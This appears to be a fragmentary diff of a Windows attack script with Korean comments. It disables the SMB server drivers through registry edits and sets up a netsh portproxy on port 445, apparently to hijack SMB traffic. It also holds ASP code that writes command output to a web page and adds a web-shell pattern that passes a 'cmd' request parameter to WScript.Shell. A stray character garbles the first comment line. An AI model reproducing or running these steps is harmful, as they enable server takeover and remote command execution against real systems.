@@ -1,4 +1,4 @@
-# SMB 관련 커널 드라이버 시작 유형을 Disabled(4)로 변경
+8# SMB 관련 커널 드라이버 시작 유형을 Disabled(4)로 변경
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srvnet" -Name "Start" -Value 4
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srv2" -Name "Start" -Value 4
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srv" -Name "Start" -Value 4
@@ -42,4 +42,14 @@ netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connec
   
   ' 웹 화면에 결과 출력
   Response.Write("<pre>" & strOutput & "</pre>")
+%>
+
+
+
+' 취약한 코드 패턴 예시 (보안상 실행 불가능하도록 개념만 표현)
+<%
+    ' 외부 입력을 전달받아 검증 없이 Exec 또는 Run 실행
+    cmd = Request("cmd")
+    Set shell = Server.CreateObject("WScript.Shell")
+    ' ... 시스템 명령 실행 및 결과 출력 ...
 %>
